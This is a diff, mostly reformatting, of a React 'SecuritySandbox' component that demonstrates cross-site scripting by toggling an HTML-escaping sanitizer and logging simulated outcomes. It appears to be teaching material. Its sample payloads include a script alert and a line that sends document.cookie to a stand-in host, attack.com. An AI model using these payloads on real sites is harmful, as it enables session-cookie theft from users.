@@ -13,15 +13,27 @@ export default function SecuritySandbox() {
   const [payload, setPayload] = useState("<script>alert('hacked')</script>");
   const [securityOn, setSecurityOn] = useState(true);
   const [logs, setLogs] = useState<LogEntry[]>([
-    { timestamp: "11:40:01", type: "info", message: "Content Security Policy initialized: script-src 'self'" },
-    { timestamp: "11:40:02", type: "info", message: "Client-server API handshake payload signature verified." },
+    {
+      timestamp: "11:40:01",
+      type: "info",
+      message: "Content Security Policy initialized: script-src 'self'",
+    },
+    {
+      timestamp: "11:40:02",
+      type: "info",
+      message: "Client-server API handshake payload signature verified.",
+    },
   ]);
   const [attackFired, setAttackFired] = useState(false);
   const [sanitizedResult, setSanitizedResult] = useState("");
 
   const runSecurityCheck = () => {
     setAttackFired(true);
-    const timeStr = new Date().toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" });
+    const timeStr = new Date().toLocaleTimeString([], {
+      hour: "2-digit",
+      minute: "2-digit",
+      second: "2-digit",
+    });
 
     const newLogs: LogEntry[] = [
       { timestamp: timeStr, type: "info", message: `Analyzing incoming string payload` },
@@ -34,16 +46,36 @@ export default function SecuritySandbox() {
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;");
-      
-      newLogs.push({ timestamp: timeStr, type: "warning", message: "Script characters detected in input. Execution blocked." });
-      newLogs.push({ timestamp: timeStr, type: "neutralized", message: "Neutralized XSS payload successfully." });
+
+      newLogs.push({
+        timestamp: timeStr,
+        type: "warning",
+        message: "Script characters detected in input. Execution blocked.",
+      });
+      newLogs.push({
+        timestamp: timeStr,
+        type: "neutralized",
+        message: "Neutralized XSS payload successfully.",
+      });
 
       setSanitizedResult(sanitized);
     } else {
-      newLogs.push({ timestamp: timeStr, type: "warning", message: "Warning: Input validation filters inactive!" });
-      newLogs.push({ timestamp: timeStr, type: "executed", message: "Injected script parsed and executed." });
-      newLogs.push({ timestamp: timeStr, type: "executed", message: "Simulation Alert: Session cookie payload intercepted." });
-      
+      newLogs.push({
+        timestamp: timeStr,
+        type: "warning",
+        message: "Warning: Input validation filters inactive!",
+      });
+      newLogs.push({
+        timestamp: timeStr,
+        type: "executed",
+        message: "Injected script parsed and executed.",
+      });
+      newLogs.push({
+        timestamp: timeStr,
+        type: "executed",
+        message: "Simulation Alert: Session cookie payload intercepted.",
+      });
+
       setSanitizedResult(payload);
     }
 
@@ -58,17 +90,23 @@ export default function SecuritySandbox() {
 
   const getLogBadgeStyle = (type: string) => {
     switch (type) {
-      case "neutralized": return "text-indigo-700 bg-indigo-50 border-indigo-100";
-      case "executed": return "text-rose-700 bg-rose-50 border-rose-100 font-bold";
-      case "warning": return "text-amber-700 bg-amber-50 border-amber-100";
-      default: return "text-zinc-500 bg-zinc-50 border-zinc-100";
+      case "neutralized":
+        return "text-indigo-700 bg-indigo-50 border-indigo-100";
+      case "executed":
+        return "text-rose-700 bg-rose-50 border-rose-100 font-bold";
+      case "warning":
+        return "text-amber-700 bg-amber-50 border-amber-100";
+      default:
+        return "text-zinc-500 bg-zinc-50 border-zinc-100";
     }
   };
 
   return (
-    <div className={`premium-card rounded-2xl overflow-hidden bg-white border transition-all duration-300 flex flex-col h-[520px] ${
-      attackFired && !securityOn ? "border-rose-450/60 shadow-sm" : "border-zinc-200"
-    }`}>
+    <div
+      className={`premium-card rounded-2xl overflow-hidden bg-white border transition-all duration-300 flex flex-col h-[520px] ${
+        attackFired && !securityOn ? "border-rose-450/60 shadow-sm" : "border-zinc-200"
+      }`}
+    >
       {/* Header */}
       <div className="px-5 py-4 border-b border-zinc-100 flex items-center justify-between">
         <div>
@@ -120,7 +158,9 @@ export default function SecuritySandbox() {
                   &lt;img&gt; Event Payload
                 </button>
                 <button
-                  onClick={() => handlePayloadChoice("javascript:fetch('http://attack.com?c='+document.cookie)")}
+                  onClick={() =>
+                    handlePayloadChoice("javascript:fetch('http://attack.com?c='+document.cookie)")
+                  }
                   className="px-3 py-2 text-left bg-zinc-50 border border-zinc-200/60 hover:border-zinc-350/50 rounded-xl text-[10px] font-mono text-zinc-600 truncate transition-colors"
                 >
                   document.cookie fetch Payload
@@ -172,9 +212,14 @@ export default function SecuritySandbox() {
 
           <div className="flex-1 overflow-y-auto space-y-2 font-mono text-[10px] bg-white p-3 rounded-xl border border-zinc-200 pr-1">
             {logs.map((log, idx) => (
-              <div key={idx} className="flex space-x-2 items-start leading-tight py-0.5 border-b border-zinc-50/50">
+              <div
+                key={idx}
+                className="flex space-x-2 items-start leading-tight py-0.5 border-b border-zinc-50/50"
+              >
                 <span className="text-zinc-400 shrink-0">[{log.timestamp}]</span>
-                <span className={`text-[8px] font-semibold shrink-0 uppercase px-1.5 py-0.5 rounded border ${getLogBadgeStyle(log.type)}`}>
+                <span
+                  className={`text-[8px] font-semibold shrink-0 uppercase px-1.5 py-0.5 rounded border ${getLogBadgeStyle(log.type)}`}
+                >
                   {log.type}
                 </span>
                 <span className="flex-1 text-zinc-600 text-[9.5px]">{log.message}</span>
@@ -186,7 +231,7 @@ export default function SecuritySandbox() {
                 <span className="text-[10px] uppercase font-bold text-zinc-800 block">
                   Interpreter Output
                 </span>
-                
+
                 {securityOn ? (
                   <div className="bg-emerald-50 border border-emerald-100 p-3 rounded-xl text-emerald-800 flex items-start space-x-2">
                     <ShieldCheck size={14} className="shrink-0 mt-0.5 text-emerald-600" />
@@ -201,9 +246,12 @@ export default function SecuritySandbox() {
                   <div className="bg-rose-50 border border-rose-100 p-3 rounded-xl text-rose-800 flex items-start space-x-2">
                     <ShieldAlert size={14} className="shrink-0 mt-0.5 text-rose-650" />
                     <div className="space-y-1 text-xs">
-                      <p className="font-bold text-[10px] text-rose-900">Sandbox Alert (Vulnerability Allowed):</p>
+                      <p className="font-bold text-[10px] text-rose-900">
+                        Sandbox Alert (Vulnerability Allowed):
+                      </p>
                       <p className="text-[9.5px] text-rose-700 mt-1">
-                        JavaScript string executed directly in sandbox. Cookie parameters transmitted.
+                        JavaScript string executed directly in sandbox. Cookie parameters
+                        transmitted.
                       </p>
                     </div>
                   </div>
